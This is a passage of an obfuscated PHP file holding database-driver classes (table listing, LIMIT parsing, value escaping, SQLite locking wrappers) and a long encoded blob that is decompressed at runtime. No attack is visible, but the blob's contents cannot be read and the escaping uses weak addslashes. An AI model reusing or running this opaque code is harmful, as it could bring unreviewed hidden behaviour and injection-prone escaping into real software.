6c\x65\x5f\143\x61\x74\141\154\157\x67\40\x3d\40\143\56\x74\141\142\x6c\145\x5f\x63\141\x74\x61\x6c\157\147\12\x9\x9\x41\x4e\x44\40\x74\56\164\x61\x62\154\x65\x5f\x73\x63\x68\145\x6d\x61\40\75\x20\x63\56\x74\x61\142\x6c\x65\x5f\163\143\x68\145\155\141\12\x9\x9\x41\x4e\104\40\x74\56\164\141\x62\154\x65\x5f\156\141\x6d\x65\x20\75\x20\143\x2e\164\141\x62\x6c\x65\137\x6e\x61\155\145\xa\11\11\127\110\x45\x52\x45\40\40\40\x74\56\164\141\142\x6c\x65\137\x6e\141\155\x65\40\75\x20\x27{$®­ãË£’}\47"; break; case $ßã‡³Ùé[943]: $û³€«×€ = $ßã‡³Ùé[944] . $®­ãË£’ . $ßã‡³Ùé[945]; break; case $ßã‡³Ùé[925]: case $ßã‡³Ùé[927]: $û³€«×€ = $ßã‡³Ùé[946] . $ßã‡³Ùé[947] . $ßã‡³Ùé[948] . strtoupper($®­ãË£’) . $ßã‡³Ùé[949] . strtoupper($®­ãË£’) . $ßã‡³Ùé[950]; break; case $ßã‡³Ùé[951]: $û³€«×€ = $ßã‡³Ùé[952] . $®­ãË£’ . $ßã‡³Ùé[953]; break; case $ßã‡³Ùé[926]: break; case $ßã‡³Ùé[954]: default: $û³€«×€ = $ßã‡³Ùé[955] . ($this->dbType == $ßã‡³Ùé[954] ? "\140{$®­ãË£’}\x60" : $®­ãË£’); } } $Šâˆ†’ = $this->query($û³€«×€); $ú¨ÌÑÈ = array(); if ($Šâˆ†’) { foreach ($Šâˆ†’ as $¹Ê·ó => $ä™²äÎõ) { $ä™²äÎõ = array_change_key_case($ä™²äÎõ); $ä™²äÎõ[$ßã‡³Ùé[32]] = isset($ä™²äÎõ[$ßã‡³Ùé[32]]) ? $ä™²äÎõ[$ßã‡³Ùé[32]] : $ßã‡³Ùé[378]; $ä™²äÎõ[$ßã‡³Ùé[33]] = isset($ä™²äÎõ[$ßã‡³Ùé[33]]) ? $ä™²äÎõ[$ßã‡³Ùé[33]] : $ßã‡³Ùé[378]; $ü¬¡ÂÛ— = isset($ä™²äÎõ[$ßã‡³Ùé[273]]) ? $ä™²äÎõ[$ßã‡³Ùé[273]] : $ä™²äÎõ[$ßã‡³Ùé[32]]; $ú¨ÌÑÈ[$ü¬¡ÂÛ—] = array($ßã‡³Ùé[32] => $ü¬¡ÂÛ—, $ßã‡³Ùé[33] => $ä™²äÎõ[$ßã‡³Ùé[33]], $ßã‡³Ùé[35] => (bool) (isset($ä™²äÎõ[$ßã‡³Ùé[103]]) && $ä™²äÎõ[$ßã‡³Ùé[103]] === $ßã‡³Ùé[12] || isset($ä™²äÎõ[$ßã‡³Ùé[35]]) && $ä™²äÎõ[$ßã‡³Ùé[35]] === $ßã‡³Ùé[12]), $ßã‡³Ùé[37] => isset($ä™²äÎõ[$ßã‡³Ùé[37]]) ? $ä™²äÎõ[$ßã‡³Ùé[37]] : (isset($ä™²äÎõ[$ßã‡³Ùé[56]]) ? $ä™²äÎõ[$ßã‡³Ùé[56]] : $ßã‡³Ùé[378]), $ßã‡³Ùé[39] => isset($ä™²äÎõ[$ßã‡³Ùé[94]]) ? strtolower($ä™²äÎõ[$ßã‡³Ùé[94]]) == $ßã‡³Ùé[41] : (isset($ä™²äÎõ[$ßã‡³Ùé[57]]) ? $ä™²äÎõ[$ßã‡³Ùé[57]] : !1), $ßã‡³Ùé[42] => isset($ä™²äÎõ[$ßã‡³Ùé[956]]) ? strtolower($ä™²äÎõ[$ßã‡³Ùé[956]]) == $ßã‡³Ùé[44] : (isset($ä™²äÎõ[$ßã‡³Ùé[94]]) ? $ä™²äÎõ[$ßã‡³Ùé[94]] : !1)); } } return $ú¨ÌÑÈ; } public function getTables($ï„°ª•¹ = '') { $½ø…³´â =& $_SERVER[óó‹¸‚å]; if (think_config($½ø…³´â[957])) { $ˆÌ¡¡‘ì = str_replace($½ø…³´â[958], $ï„°ª•¹, think_config($½ø…³´â[957])); } else { switch ($this->dbType) { case $½ø…³´â[925]: case $½ø…³´â[927]: $ˆÌ¡¡‘ì = $½ø…³´â[959]; break; case $½ø…³´â[924]: case $½ø…³´â[942]: $ˆÌ¡¡‘ì = $½ø…³´â[960]; break; case $½ø…³´â[951]: $ˆÌ¡¡‘ì = $½ø…³´â[961]; break; case $½ø…³´â[926]: think_exception(think_lang($½ø…³´â[962]) . $½ø…³´â[963]); break; case $½ø…³´â[943]: $ˆÌ¡¡‘ì = $½ø…³´â[45] . $½ø…³´â[46] . $½ø…³´â[47]; break; case $½ø…³´â[954]: default: if (!empty($ï„°ª•¹)) { $ˆÌ¡¡‘ì = $½ø…³´â[906] . $ï„°ª•¹ . $½ø…³´â[907]; } else { $ˆÌ¡¡‘ì = $½ø…³´â[908]; } } } $Ê…Ï½¯ = $this->query($ˆÌ¡¡‘ì); $˜Œ¥ƒÉ­ = array(); foreach ($Ê…Ï½¯ as $Ê…š Á¬ => $ˆÎÕÏ¼‘) { $˜Œ¥ƒÉ­[$Ê…š Á¬] = current($ˆÎÕÏ¼‘); } return $˜Œ¥ƒÉ­; } protected function parseLimit($ö™¢†Ã¡) { $ã”¶éŸ¹ =& $_SERVER[óó‹¸‚å]; $İ¼·›çó = $ã”¶éŸ¹[12]; if (!empty($ö™¢†Ã¡)) { switch ($this->dbType) { case $ã”¶éŸ¹[951]: case $ã”¶éŸ¹[943]: $ö™¢†Ã¡ = explode($ã”¶éŸ¹[50], $ö™¢†Ã¡); if (count($ö™¢†Ã¡) > 1) { $İ¼·›çó .= $ã”¶éŸ¹[51] . $ö™¢†Ã¡[1] . $ã”¶éŸ¹[52] . $ö™¢†Ã¡[0] . $ã”¶éŸ¹[53]; } else { $İ¼·›çó .= $ã”¶éŸ¹[51] . $ö™¢†Ã¡[0] . $ã”¶éŸ¹[53]; } break; case $ã”¶éŸ¹[924]: case $ã”¶éŸ¹[942]: break; case $ã”¶éŸ¹[926]: break; case $ã”¶éŸ¹[925]: case $ã”¶éŸ¹[927]: break; case $ã”¶éŸ¹[954]: default: $İ¼·›çó .= $ã”¶éŸ¹[51] . $ö™¢†Ã¡ . $ã”¶éŸ¹[53]; } } return $İ¼·›çó; } public function parseKey(&$ïÆì¾“¡, $—Šæ¬ÑÁ = true) { $é‡–ÎŸÒ =& $_SERVER[óó‹¸‚å]; if ($—Šæ¬ÑÁ) { $ïÆì¾“¡ = $this->parseKeyCheck($ïÆì¾“¡); } if ($this->dbType == $é‡–ÎŸÒ[954]) { if ($ïÆì¾“¡ != $é‡–ÎŸÒ[188] && !preg_match($é‡–ÎŸÒ[918], $ïÆì¾“¡)) { $ïÆì¾“¡ = $é‡–ÎŸÒ[385] . trim($ïÆì¾“¡, $é‡–ÎŸÒ[385]) . $é‡–ÎŸÒ[385]; } return $ïÆì¾“¡; } else { return parent::parseKey($ïÆì¾“¡, $—Šæ¬ÑÁ); } } public function close() { $this->_linkID = null; } public function error() { $Àøı¥Ö =& $_SERVER[óó‹¸‚å]; if ($this->PDOStatement) { $ÊÇ®µ¥ã = $this->PDOStatement->errorInfo(); $this->error = $ÊÇ®µ¥ã[1] . $Àøı¥Ö[4] . $ÊÇ®µ¥ã[2]; } else { $this->error = $Àøı¥Ö[12]; } if ($Àøı¥Ö[12] != $this->queryStr) { $this->error .= LNG($Àøı¥Ö[48]) . $this->queryStr; } think_trace($this->error, $Àøı¥Ö[12], $Àøı¥Ö[49]); return $this->error; } public function escapeString($ÍÇ¯ªêş) { $ÇŠŸ®ÚÕ =& $_SERVER[óó‹¸‚å]; switch ($this->dbType) { case $ÇŠŸ®ÚÕ[951]: case $ÇŠŸ®ÚÕ[924]: case $ÇŠŸ®ÚÕ[942]: case $ÇŠŸ®ÚÕ[954]: return addslashes($ÍÇ¯ªêş); case $ÇŠŸ®ÚÕ[926]: case $ÇŠŸ®ÚÕ[943]: case $ÇŠŸ®ÚÕ[925]: case $ÇŠŸ®ÚÕ[927]: return str_ireplace($ÇŠŸ®ÚÕ[58], $ÇŠŸ®ÚÕ[59], $ÍÇ¯ªêş); } } protected function parseValue($¬Şå…) { $«ı¾¸ÔÙ =& $_SERVER[óó‹¸‚å]; if (is_string($¬Şå…)) { $·î©õÙ = strpos($¬Şå…, $«ı¾¸ÔÙ[4]) === 0 && in_array($¬Şå…, array_keys($this->bind)); $¬Şå… = $·î©õÙ ? $this->escapeString($¬Şå…) : $«ı¾¸ÔÙ[964] . $this->escapeString($¬Şå…) . $«ı¾¸ÔÙ[964]; } elseif (isset($¬Şå…[0]) && is_string($¬Şå…[0]) && strtolower($¬Şå…[0]) == $«ı¾¸ÔÙ[297]) { $¬Şå… = $this->escapeString($¬Şå…[1]); } elseif (is_array($¬Şå…)) { $¬Şå… = array_map(array($this, $«ı¾¸ÔÙ[965]), $¬Şå…); } elseif (is_bool($¬Şå…)) { $¬Şå… = $¬Şå… ? $«ı¾¸ÔÙ[88] : $«ı¾¸ÔÙ[197]; } elseif (is_null($¬Şå…)) { $¬Şå… = $«ı¾¸ÔÙ[103]; } return $¬Şå…; } public function getLastInsertId() { $ÛÇı´Ñé =& $_SERVER[óó‹¸‚å]; switch ($this->dbType) { case $ÛÇı´Ñé[951]: case $ÛÇı´Ñé[943]: case $ÛÇı´Ñé[924]: case $ÛÇı´Ñé[942]: case $ÛÇı´Ñé[926]: case $ÛÇı´Ñé[954]: return $this->_linkID->lastInsertId(); case $ÛÇı´Ñé[925]: case $ÛÇı´Ñé[927]: $ÎûËäè­ = $this->table; $ªè“×´  = $this->query("\123\105\x4c\105\103\x54\40{$ÎûËäè­}\56\x63\165\162\162\166\141\154\40\143\165\162\162\166\x61\x6c\x20\x46\122\x4f\x4d\40\144\x75\141\x6c"); return $ªè“×´  ? $ªè“×´ [0][$ÛÇı´Ñé[966]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ß‰Õ£ªö) { $‚ƒñ¶ =& $_SERVER[óó‹¸‚å]; if (!CacheLock::fileLock($‚ƒñ¶[13])) { return !1; } $Ş™Êôª° = parent::query($ß‰Õ£ªö); CacheLock::fileUnLock($‚ƒñ¶[13]); return $Ş™Êôª°; } public function execute($…Â®’•³) { $†í¾İŞÄ =& $_SERVER[óó‹¸‚å]; if (!CacheLock::fileLock($†í¾İŞÄ[13])) { return !1; } $Ç´Æû÷ = parent::execute($…Â®’•³); CacheLock::fileUnLock($†í¾İŞÄ[13]); return $Ç´Æû÷; } } class DbSqlite3 extends DbSqlite3Base { public function query($ì‘äèÌ–) { $ê™ùŸøß =& $_SERVER[óó‹¸‚å]; if (!CacheLock::fileLock($ê™ùŸøß[13])) { return !1; } $¼ä£’™Û = parent::query($ì‘äèÌ–); CacheLock::fileUnLock($ê™ùŸøß[13]); return $¼ä£’™Û; } public function execute($ÙÑÉğ½„) { $„Óã´ºŞ =& $_SERVER[óó‹¸‚å]; if (!CacheLock::fileLock($„Óã´ºŞ[13])) { return !1; } $é®İëö‚ = parent::execute($ÙÑÉğ½„); CacheLock::fileUnLock($„Óã´ºŞ[13]); return $é®İëö‚; } } goto f‰‹”¹Óé·; aÊè Ñ‚˜: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('8/OLuILl'), "\xc8\xfd\xbd\x94\x9a\xfe"); $_SERVER[óó‹¸‚å] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x78\x1b\xd5\xd5\x30\xdc\x42\x58\x5b\xa0\x40\x4b\x5b\x68\x61\x62\x8\xb6\x13\x2d\x8e\xb3\x3b\x71\x12\xd9\x96\x63\x25\xb2\x64\x24\x39\xab\xc2"."\144\54\215\254\261\45\215\74\63\362\226\345\145\155\312\22\102\331\312\332\66\54\5\12\141\51\55\145\13\264\224\322\205\265\154\145\347\55\44\41\55\120\136\226\226\122\266\357"."\x2e\xe7\x2e\x33\x92\xe1\xfd\x9f\xff\x7b\x9e\x2f\x90\xe8\xee\x73\xef\xb9\xf7\x9e\x7b\xce\xb9\xe7\x9c\xfb\xca\xb\x3f\xdd\x72\xc7\xc3\x1b\xf6\xda\x30\x69\xc3\xbe\x1f\x6c\xdd\x79\xf7\x9e\xd3\x69"."\x78\xc3\xde\xe8\xbf\x49\x34\x7c\xcc\x59\xfb\x7f\x89\xfc\x39\xfc\xac\x33\x1b\x1a\xba\x66\x1f\x38\x2d\xf6\xd5\xad\xbf\xd8\xae\xed\xdb\x76\xd1\xbf\x1f\xf8\xc5\xc3\x97\x3f\xf5\xdf\xf\xff\x2c\x95"."\135\170\327\345\375\107\177\351\77\357\375\346\223\26\124\224\326\154\241\77\112\311\164\24\175\324\260\35\233\46\144\314\122\316\350\247\141\243\104\177\203\364\247\67\21\265\364\242"."\351\350\64\32\240\77\52\364\212\374\153\17\25\14\226\257\306\342\51\65\331\333\323\23\116\244\240\120\213\234\137\64\263\20\52\153\226\126\204\357\227\165\313\106\275\221\233\123"."\313\146\131\57\271\122\104\102\126\163\264\76\315\206\226\72\332\324\216\160\117\64\276\112\115\255\352\11\103\211\76\165\250\242\133\143\64\106\202\111\107\263\234\224\121\324\171\211".strrev('º'."\n".'ÿPRÒZ\'§:¬¾Ô-´hñÓª¤îïÜš1âEOj,P‰RS$¼-«÷‹')."\152\224\162\146\203\262\216\346\254\123\32\151\240\323\320\13\131\32\54\151\254\73\316\130\31\102\51\36\102\323\124\252\24\12\64\22\343\241\254\236\323\52\5\200\126\207\34\51"."\x5b\x46\x51\x63\x83\x5e\xa6\x8f\xf1\x54\x1a\xd0\x2a\x8e\x69\x94\x32\x34\x12\x1e\x75\x2c\x4d\xa4\xa3\xbe\x66\xd0\x44\xeb\x25\x68\x2a\x19\x8e\x86\xdb\x53\xa\xee\xa0\xd2\x99\x88\x77\x2b\x30\x9"."\x45\xcd\x76\x74\x4b\x59\xd1\x15\x4e\x84\x15\xdc\xe9\xd6\x7a\x32\xd6\x7a\x5\xd6\x4b\xc\x81\x42\x9\x45\xa3\xca\x44\x2d\x38\x7a\xb1\xcc\x9a\xa1\x75\x6a\x34\x16\x4f\x74\x84\x13\x4a\xdb\x2a\x45"."\x40\x28\x63\x16\x8b\x66\x29\x80\x5a\x41\x33\xe9\x48\x5d\xd\x27\x12\x34\xe0\x83\xe5\x1d\x8d\xe0\x49\x83\x48\xbc\xb3\x33\x19\xe6\x31\x18\xdc\x9\x51\xd4\x93\x19\xb0\x3e\x5d\xb1\x6c\xae\xe0\xa8".strrev('Ø4Ã†Úv}QYè¥iXT+o“L&…2À¨ÉFCºXm5ø‡­ı é–Â¡ZÃ')."\272\220\376\316\207\102\175\52\316\323\55\107\325\113\31\63\153\224\140\263\56\202\105\247\71\371\16\313\100\5\150\74\147\26\262\54\154\33\343\60\224\234\121\320\143\225\242\134"."\204\107\63\171\243\220\265\330\376\372\274\222\64\32\345\333\25\227\25\261\62\352\11\337\351\106\156\114\354\67\333\254\130\31\75\202\166\204\250\327\303\113\117\207\102\272\343\240"."\xc1\x1\x6c\xc\xb3\xb7\x5c\x30\xb5\x6c\x52\xb7\xf8\xd0\xc\xb3\x13\x55\x8c\x57\x1c\x39\xb1\x42\x8a\x75\x9a\x56\xb1\x3\x61\x6\xf8\x3e\xda\x15\x46\x6f\x8d\x8c\x41\xb6\x2f\xb2\x12\xc4\x82\xd".base64_decode('a072f7p2zWL0TyOgvjT0Ka8XCqo+qsPGKWZn2QwYQbvPKAVRCo1G4mpes/Pd2Vkq')."\251\305\60\152\126\37\15\224\363\145\330\325\174\43\247\135\13\33\203\56\146\72\141\11\57\27\314\214\126\220\207\110\303\171\307\51\47\365\122\26\103\2\206\142\216\224\10\244"."\312\272\16\205\72\174\112\126\351\126\126\51\135\55\106\213\315\52\26\13\74\304\106\307\323\154\236\350\214\262\351\314\346\150\240\217\35\13\165\360\101\303\46\30\116\154\117\255".base64_decode('XC4YGc0xzFLQzDi647cdS9egxVAmo9u2v90sOZZZ8IcKBXPEH7eMfqPUokwFZIsy').base64_decode('0ab2YwTYAju1br6CFwr+zNTWipPzz2U7kJe2tJKd0y1/GHZGi4I6y7EgK9Zh2GXT').strrev('(µ¨¿­,{û®µh)İ%•_Y·K'."\r".'–'."\r".'•W¤£J7”çë|ÑcL´qÍZ÷p6').base64_decode('5Uofggzs1BpptDSApkXJ4KhPKVZsx2/pCBUZ6LgDIEdy/m68rww9608ijA3JM5pm').base64_decode('KmjpKCyPpnalUj1qpBMdybGw2h1KtXdBtx2tn/U5ivAwb5IlrvSj/YUXVwyNVST2')."\230\43\272\205\76\334\66\326\242\14\232\331\76\163\64\300\262\160\341\44\102\64\254\60\236\356\262\343\117\150\245\176\14\237\276\61\107\207\45\150\17\367\273\1\35\325\113\375".base64_decode('Tp5VTIYTy8MJNRnvTK0IJeAwL6FVMso+hZsu+BN6FoE+47B6WhlDjZXBmwPPFcvF')."\x1b\x86\xe5\x45\x23\x4b\x30\x60\x3a\xfc\x36\x2a\xe4\x97\x4b\xb1\xb6\xa3\x46\xd1\xc0\x7d\x77\x78\xe\x81\x24\x3a\xe9\x97\x40\x87\x82\x64\x40\xad\xe9\xfc\xd4\x86\x74\x76\x5a\xa3\x1f\xfd\x3b\xb5".strrev('¤»>Ïô–d¹«`ÜËâRh•WAAZzD•³MÍ+¦§ê! ¢íu0#ºMq')."\155\357\1\53\115\114\204\117\350\15\47\123\152\167\70\325\25\357\200\257\207\103\20\212\232\164\333\262\321\256\241\77\153\141\166\327\322\37\325\260\73\245\143\5\107\71\372\121"."\315\276\1\64\31\335\72\303\261\71\212\243\43\105\255\337\203\362\161\254\333\264\164\167\212\70\252\126\30\131\166\46\340\150\227\156\364\347\1\136\6\156\55\143\26\114\113\53"."\x60\xcc\xc8\x36\x85\xce\xb0\x55\xbf\x1\xd8\xa\x90\xb0\x88\x24\x8d\x62\x99\x75\xd6\xc9\x57\x8a\x7d\x52\x10\xb0\xbd\x8d\xd6\xf\xc3\x65\x79\x93\x9f\x67\xa6\x5\xa1\x96\x20\x14\x9c\xd2\xdc\xc9"."\260\175\60\71\3\375\57\120\173\326\54\152\14\121\22\24\247\147\51\216\243\111\123\135\71\135\272\46\16\151\307\162\114\234\152\271\212\40\200\346\115\230\330\176\235\165\251\302"."\xfb\xc6\x7a\x99\xd5\xb\x3a\x83\x46\x5e\x67\xc7\x44\x13\x14\x43\xc7\x1c\x87\x55\x8e\xcf\x19\xa2\xf6\x50\xaa\x38\x9f\xd\x3b\x81\x6a\x62\xa4\xce\xe2\x2b\x30\x79\x2c\x12\x1c\x5e\xb4\x80\x4e\xa8".base64_decode('OJlxEe+x9JwBm7SEZqRbswbZaNAMiLWCI9I66uyNRtX2eCyFSGqasiIRSYXZug11')."\xa8\xa1\xf6\x1e\x7e\xf0\x8a\x19\x85\x2\x18\xc1\x54\x9f\x1e\x34\x65\xb8\x19\x3a\x8e\xba\x13\x14\xc7\x1c\xc2\xd8\x65\xb3\x64\xeb\xfe\xc\xd4\x10\xa4\x77\x55\x56\x56\x9c\x2\x80\x67\xc4\xc9\xe1"."\x39\xc\x46\xfd\x5a\x71\xdc\x5f\x44\x5b\xc0\xcf\x3b\xea\x3e\x83\x95\x94\x7c\x94\x47\x60\x96\x4\x72\xc7\x60\x44\x5c\x11\x3b\xfc\x7b\xe2\x49\xa8\xb0\x8\xa7\x22\x2\xac\x4f\xb7\xe0\x63\x3d\xbd"."\220\125\224\126\310\222\60\44\36\310\316\163\15\310\252\320\212\44\103\314\25\124\336\62\306\65\61\244\105\254\77\154\40\305\202\240\347\334\243\362\13\310\247\272\42\261\145\152"."\x77\xbc\x23\x1c\x55\x23\x31\x84\x99\x52\xd5\xe9\xbd\x3d\x1d\x21\x36\x95\x72\x7a\x5b\x3c\xd5\xe5\x4a\xed\x45\xb8\x69\x79\x28\x1a\xf1\x16\xf\xaf\x8c\x24\x53\xc9\x9a\x59\x28\xad\x37\xec\xc9\x41".base64_decode('jGBPItwZWcmjnZFwtCOptofau0SZWKgbImoOs2J20F1eRUg2yRk6dRgzpwxYqouH').strrev('Ç*ÊqRP•@ÙAØÒ&Á¨¢8dY!8;'."\n".'ÌgÀ$dÄ³VS„5Š wR').base64_decode('Bn1jPEiGweKIZITvK4Dwq3qg4jJteo7j4doJoZzD0b0njha/yEMzECK8N1oJZEbg')."\63\6\332\112\226\23\142\335\311\11\276\127\215\367\204\23\41\314\65\253\53\22\361\330\22\250\60\222\327\131\7\42\0\376\6\106\134\1\363\354\10\204\204\50\43\215\161\121"."\2\350\3\46\3\345\6\372\163\74\375\101\104\41\174\134\57\61\250\367\141\334\314\116\27\26\310\241\335\300\360\252\131\341\137\353\63\315\2\333\247\210\76\340\10\203\63\337".base64_decode('AzZbJKMM1UxjBxScD6n4snBMZSuLxqTVSBMQOxtPAEAcc5DxZDQzEU6yXW7pQxWD')."\x81\x2b\x18\x98\x6\xab\x58\x47\x47\x10\x7c\x3e\x78\x62\x7a\x64\x5a\xc3\x1a\xff\xb4\xc0\x5a\x14\x68\x9c\xba\x98\x46\x21\x96\xe\xb8\xa2\xc7\x41\xfd\x8a\xc5\x6b\x63\xb2\xa9\xc1\x5e\xd4\xd8\x92".base64_decode('DqaDDYta1oT845p/vMk/z792WjrQOA0S1q5v9s3ciAuggouOXYt+WtOLpqT9x29a')."\267\170\115\172\155\175\313\264\311\351\300\261\351\221\265\123\33\27\261\357\144\52\26\342\67\63\143\274\253\331\151\15\250\113\210\234\342\105\112\4\345\111\5\130\306\270\121\26".base64_decode('qetnb2TpaA71flFjjT89be0iqZ6U5P0WIpcQ/s3zciH/ajwyXhXve1gflVJGYE+8').strrev('ØtÀA¤¢˜†2R³«†r”5£ëöDÙ¿¡O×â¦îŸ9Ó:·Ä¿£à´ú/').base64_decode('+u7TnRGdLQ+U7oqjxcFYR5QlxQqEMIQvYIaKr1G+mIyyiimsER7L6iWYpwOgtJ3R')."\312\172\122\32\241\252\246\102\155\321\260\312\60\14\140\142\26\47\130\261\215\213\354\320\320\4\106\145\370\41\43\110\170\302\255\300\316\267\207\12\12\101\14\212\156\131\246\325"."\102\244\227\166\245\214\111\63\304\231\71\10\266\12\342\351\225\326\205\12\5\71\324\123\345\11\50\153\214\116\300\334\266\56\66\75\306\120\320\247\262\230\41\33\21\124\214\272"."\x9\x36\xa4\xd3\x95\x35\x7a\x76\xed\x1a\xb4\xf0\x35\x7f\x6e\xed\xfa\x19\x1b\x1b\x19\x95\x1f\x4c\xa3\x3f\x2c\x12\xaa\x21\x47\x53\x39\x36\x54\xd1\xf9\x1c\xc0\xfd\xe0\xa2\x14\x57\x84\x67\xd3\xa8"."\151\161\22\251\354\42\242\35\323\321\12\256\46\122\70\205\241\46\166\160\203\120\201\316\166\124\140\54\174\224\113\2\110\202\116\143\234\211\347\262\21\111\2\206\153\44\165\47"."\xc0\x4b\xf8\xa4\x4c\x15\xc5\x5d\xc2\xe0\xd6\x3a\x86\xec\x4b\x68\x3b\xb5\x4b\x47\x1d\x15\xed\x24\xc7\x6c\x47\x2f\xba\xa4\x96\xb6\xae\x59\x99\x7c\x67\xa5\x50\x70\x38\x29\x5f\x30\x6\xe1\xb\xb0"."\127\100\210\352\207\323\140\132\255\252\235\246\305\70\342\251\320\215\272\251\265\12\106\112\45\304\277\312\113\115\34\262\113\102\210\234\111\51\15\114\340\247\104\142\112\133\74\36"."\xd\x87\x62\xa\x3e\xcf\xe1\x1c\x42\xc4\x42\x32\xdc\x13\x42\x87\x18\xe6\xad\x93\xa9\x30\xc8\x20\x23\x1d\x7e\xd6\xee\x4a\x7f\x4\x38\x2c\x1e\x30\x0\xec\x66\x19\x63\x10\x15\xc1\x44\x45\x9c\xcc"."\x20\x9b\x4b\x84\x10\x1d\x56\x14\xe4\x65\x10\xc3\x84\xa6\xf\x4b\x88\x7c\x98\xd2\xf0\xa1\x31\xf8\x30\x7b\xe4\x13\x54\xbc\x4f\x8\xdc\x7c\xc3\x86\x3e\x42\x2\x9c\xd8\xf6\x1\xd\xee\x73\x34\xb"."\21\14\230\110\206\140\244\303\147\330\35\204\201\40\37\40\131\254\103\116\36\313\101\12\332\230\217\166\56\252\17\353\5\37\353\232\217\365\330\307\170\103\37\141\350\72\240\133"."\275\150\163\101\267\110\20\341\320\274\17\57\47\274\232\175\102\40\350\63\107\112\272\105\212\0\230\4\357\341\23\174\211\257\337\62\53\345\36\366\115\51\106\273\5\11\242\317".base64_decode('PCFhmo6P8Zo+mQ2FXoTYrqkJztqjIfD3dgLmDmdVQ+kLJqt6Ptws93raIvD0G9mZ').strrev('´¦ã•é‡/a(+îB¤,e°òvB­jò¼°Ú@xÆØ¹hDxb.‚Ãm—¦#*ç')."\376\244\364\71\107\353\147\337\302\250\14\345\116\130\224\206\23\172\146\54\43\130\326\16\211\21\166\307\334\233\253\202\332\113\152\71\317\40\175\144\227\325\332\41\265\127\0\137"."\365\174\302\16\74\340\0\6\161\266\25\370\354\273\166\320\27\357\135\30\45\101\227\361\262\40\70\150\147\61\312\116\242\3\260\263\300\100\324\54\147\3\262\366\271\143\170\353"."\5\10\362\46\327\52\111\56\333\210\206\73\123\312\322\70\302\164\206\251\322\72\52\56\254\220\177\314\222\342\152\233\201\113\151\45\371\42\256\225\262\64\145\35\72\25\326\265"."\326\261\217\324\271\252\213\105\343\356\204\217\105\225\352\145\210\301\55\3\1\57\16\62\174\161\222\261\244\270\70\70\53\100\45\152\66\360\153\130\114\16\41\235\245\211\251\225"."\127\251\204\214\104\2\353\227\353\273\70\52\166\30\133\22\12\376\200\117\242\153\60\302\361\213\275\42\105\335\40\367\254\110\317\161\213\101\324\143\224\306\214\222\54\321\22\251".strrev('†Mîƒ¤3KC¾¥UÇ½AÎ!s”Q‚¾i$™‰ÄzaDÇ\\êŞÄâ')."\52\373\66\354\156\130\361\171\315\22\300\144\70\11\43\6\41\47\304\105\104\124\52\226\323\206\5\61\343\252\43\141\26\333\31\143\275\227\203\356\106\151\264\143\242\110\27\27"."\204\324\212\312\170\312\260\243\10\166\265\302\144\244\51\263\146\24\13\333\130\230\22\13\374\116\21\115\102\3\103\52\100\214\250\222\110\201\43\45\67\306\243\135\12\361\3\0"."\35\253\350\120\244\141\104\373\27\320\131\150\5\360\36\132\202\117\64\371\60\161\23\44\111\35\155\30\250\47\132\113\126\345\311\245\205\70\11\37\16\342\60\141\260\26\133\120"."\xc0\x5f\xec\x37\xd7\x52\xe9\x17\xbd\xc3\x38\x5c\xad\xee\x14\x5e\xee\xb5\xe3\x9d\x96\xc9\xa9\x66\x4e\x24\x78\xb\xb5\x13\xb6\x94\xdf\x66\x7a\xe\x76\x9\x38\x2e\x62\xa4\x2a\x49\xaa\xe3\x25\x4b"."\74\251\236\250\230\25\327\251\104\223\230\10\132\313\26\215\122\300\242\147\137\0\61\33\160\3\355\153\222\50\67\201\224\326\333\344\24\201\263\162\243\147\322\35\323\104\34\254"."\25\260\320\227\105\207\44\204\10\330\204\134\120\342\103\123\246\67\170\53\66\312\220\120\273\233\254\142\65\223\145\215\155\13\340\117\52\374\63\234\6\4\234\146\144\6\305\126".strrev('%\\S|Ià¾MUNrx#&i[¥/&MH>'."\n".'ppÖpšc2rSÑ2i¡´5†Ö').base64_decode('3ZQGJE4lBEBAEEbypXzGLMM6kHRQiuawLiUGbMcsixwpSrOlLNGoVIpPDekH2mJZ')."\102\124\13\100\221\262\120\227\360\347\164\27\7\60\107\22\220\161\171\310\262\330\262\245\203\303\27\75\50\121\116\302\30\60\311\366\134\255\43\215\66\36\36\26\32\46\264\51".base64_decode('/OEAxQABLZuNs8suOVxdVJZV1m6IqPvwpqRY7eKhQkGoCHjjE1ahm12uJKdMWK2T')."\60\307\354\312\256\126\32\147\204\344\315\346\46\346\205\142\207\227\350\167\343\355\211\11\234\11\220\234\230\320\332\161\104\23\264\347\215\222\156\363\243\335\262\153\341\254\377\307"."\224\164\365\34\340\275\62\321\302\301\171\222\174\33\353\274\15\273\316\161\56\304\25\50\113\42\125\310\261\257\72\56\42\53\101\332\220\66\217\153\75\240\315\112\307\214\217\245".strrev('¿ıêw¼­æËÔLg+C—\'AÆóç”j&¾xYÂW*ÑùFç‚lbgN[Ô+ÚÆmH')."\375\323\13\64\374\351\331\257\375\343\17\327\303\22\313\144\373\7\106\100\112\6\214\12\372\167\37\364\227\204\205\106\343\351\53\327\233\107\375\376\320\375\366\172\177\375\334\133"."\375\15\3\135\77\270\262\341\214\356\265\27\277\332\176\145\307\31\133\257\72\156\321\221\307\134\64\262\376\236\31\37\224\266\256\137\137\167\375\277\217\271\252\370\352\307\77\250"."\13\257\375\111\140\365\57\72\277\362\213\305\107\315\137\174\326\244\310\343\146\262\365\135\377\135\43\37\335\61\377\217\113\47\205\356\236\61\377\356\71\63\76\272\354\367\123\77"."\333\271\275\176\321\370\273\317\354\377\327\311\213\67\316\75\100\133\374\136\173\136\333\353\303\77\275\170\173\176\133\142\352\352\237\314\334\371\235\377\376\350\223\307\137\263\217\71"."\375\330\372\31\53\226\175\154\316\231\162\313\226\167\56\176\254\141\250\363\330\256\271\77\370\60\175\364\312\124\340\244\163\373\352\266\236\277\371\73\357\277\60\351\256\213\357\77"."\355\201\155\317\77\141\276\177\360\221\317\57\136\264\347\127\163\63\317\275\23\235\373\320\107\267\337\347\373\326\41\137\271\363\300\77\134\221\262\17\331\164\357\215\377\165\313\161"."\317\155\170\366\215\247\76\354\70\352\177\156\135\275\354\370\355\217\56\374\261\371\313\371\227\